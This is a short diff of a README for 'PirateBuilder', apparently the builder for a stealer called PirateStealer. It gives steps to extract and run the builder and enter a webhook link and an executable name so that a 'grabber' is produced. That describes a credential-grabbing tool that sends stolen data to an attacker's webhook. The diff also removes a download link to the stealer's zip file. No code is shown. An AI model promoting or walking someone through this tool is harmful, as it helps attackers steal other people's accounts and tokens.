@@ -1,19 +1,14 @@
 
 # PirateBuilder
-## Official PirateBuilder
 
-# Build
+## Builder
 1. You need to extract the file "PirateBuilder.rar".
 2. Start "PirateBuilder.exe".
 3. Put your Webhook link and your .exe name.
 4. The grabber will be done automatically.
 
-![](https://media.discordapp.net/attachments/877960059781529710/878229324262699089/PirateMonster-removebg-preview_3.png)
 # Support
 https://discord.gg/terms
-
-
-# [Builder](https://github.com/Stanley-GF/PirateStealer/releases/download/1.4/PirateStealer.zip)
 
 ![Login](https://media.discordapp.net/attachments/121237397445804032/889544742965223454/Discord_8b6cxYPMLE.png?width=566&height=683)
 
